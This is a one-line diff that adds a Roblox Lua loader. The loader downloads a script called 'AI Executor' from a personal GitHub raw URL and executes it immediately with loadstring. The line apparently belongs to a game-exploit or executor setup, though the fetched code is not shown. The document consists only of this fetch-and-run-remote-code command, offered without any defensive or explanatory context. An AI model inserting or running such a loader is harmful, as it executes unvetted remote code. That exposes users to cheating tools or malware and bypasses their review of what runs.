@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Obunga-666/AI/refs/heads/main/AI%20Executor"))()
